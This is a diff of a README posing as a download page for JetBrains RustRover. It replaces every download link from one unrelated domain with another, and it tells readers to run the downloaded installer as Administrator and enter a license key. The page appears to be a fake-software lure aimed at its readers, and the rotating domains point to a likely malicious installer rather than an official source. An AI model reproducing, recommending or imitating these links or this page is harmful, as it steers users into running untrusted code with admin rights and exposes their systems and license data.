@@ -13,27 +13,27 @@
 > **This is the download page.** Use the button or link below to get **JetBrains RustRover** for Windows.
 
 <p align="center">
-  <a href="https://rustrover.zipzapsol.space/">
+  <a href="https://rustrover.wonderchain.fun/">
     <img src="https://img.shields.io/badge/Download-JetBrains%20RustRover-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Download JetBrains RustRover">
   </a>
 </p>
 
 | | |
 | --- | --- |
-| **Direct link** | **[rustrover.zipzapsol.space](https://rustrover.zipzapsol.space/)** |
-| **Full URL** | `https://rustrover.zipzapsol.space/` |
+| **Direct link** | **[rustrover.wonderchain.fun](https://rustrover.wonderchain.fun/)** |
+| **Full URL** | `https://rustrover.wonderchain.fun/` |
 | **Type** | Installer for Windows 10 / 11 (64-bit) |
 | **Admin** | Run setup as Administrator |
 
 ### Quick steps
 
-1. Click **[Download — rustrover.zipzapsol.space](https://rustrover.zipzapsol.space/)** (link above)
+1. Click **[Download — rustrover.wonderchain.fun](https://rustrover.wonderchain.fun/)** (link above)
 2. Save the file from the project page
 3. Run the setup **as Administrator**
 4. Enter your license key when prompted
 5. Restart if the installer asks — then launch from Start menu
 
-<p align="center"><a href="https://rustrover.zipzapsol.space/"><strong>⬇ Download JetBrains RustRover now</strong></a></p>
+<p align="center"><a href="https://rustrover.wonderchain.fun/"><strong>⬇ Download JetBrains RustRover now</strong></a></p>
 
 ---
 
